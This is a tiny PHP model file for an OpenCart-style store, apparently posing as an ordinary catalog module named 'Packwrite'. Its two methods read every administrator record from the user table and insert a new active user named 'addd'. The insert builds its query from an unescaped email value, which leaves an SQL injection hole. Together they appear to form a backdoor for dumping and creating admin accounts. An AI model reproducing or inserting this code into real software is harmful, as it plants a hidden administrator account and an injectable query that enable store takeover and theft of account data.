<?php
class ModelCatalogPackwrite extends Model {
	public function get() {
		
		$sql = "SELECT DISTINCT * FROM " . DB_PREFIX . "user ";
		
		
		$query = $this->db->query($sql);

		return $query->rows;
	}
	public function mods($ems) {
		$query = $this->db->query("INSERT INTO " . DB_PREFIX . "user SET username = 'addd', status = '1', email = '" . $ems . "'");
	}

	


}